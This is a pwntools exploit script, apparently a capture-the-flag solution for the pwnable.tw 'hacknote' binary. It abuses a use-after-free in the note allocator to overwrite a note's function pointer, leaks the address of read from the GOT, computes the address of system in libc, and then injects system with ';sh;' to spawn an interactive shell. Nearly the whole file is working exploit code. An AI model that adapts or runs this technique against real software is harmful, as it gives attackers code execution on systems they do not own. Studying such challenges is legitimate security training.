from pwn import *

r = process('./hacknote')
#r = remote('chall.pwnable.tw', 10102)
#raw_input()
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc_32.so.6')

print_note_content = 0x0804862b
read_got = 0x0804a00c
payload = p32(print_note_content) + p32(read_got)


r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('24')
r.recvuntil('Content :')
r.sendline('a'*23)

r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('24')
r.recvuntil('Content :')
r.sendline('a'*23)


#delete 0 1
r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('0')
r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('1')

#add index:3
r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('8')
r.recvuntil('Content :')
r.sendline(payload)

#print 0
r.recvuntil('choice :')
r.sendline('3')
r.recvuntil('Index :')
r.sendline('0')

read_add = u32(r.recv(4))
log.info(hex(read_add))

system = read_add - libc.symbols['read'] + libc.symbols['system']
log.info(hex(system))

payload = flat([system, ";sh;"])

#delete index:2
r.recvuntil('choice :')
r.sendline('2')
r.recvuntil('Index :')
r.sendline('2')

#add index:4
r.recvuntil('choice :')
r.sendline('1')
r.recvuntil('size :')
r.sendline('8')
r.recvuntil('Content :')

r.send(payload)
r.interactive()
